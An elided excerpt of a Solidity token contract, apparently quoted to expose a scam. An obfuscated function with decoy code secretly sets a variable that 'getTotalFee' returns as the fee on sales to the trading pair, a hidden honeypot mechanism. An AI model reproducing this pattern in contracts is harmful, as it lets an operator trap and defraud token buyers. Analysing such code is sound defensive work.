...
contract TEST is IERC20, Ownable {
    ...
    function Derfortyis(uint64[3][4][4] memory bcjddgrt) external returns(bytes32) {
        string memory a = "Tx Hash";
        uint dfg = 32;
        uint urtyru = 3;
        bool Temps = true;
        ngtkjlifg =dfg + urtyru +bcjddgrt[1][2][2];
        return 0;
    }
    ...
    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return ngtkjlifg;}
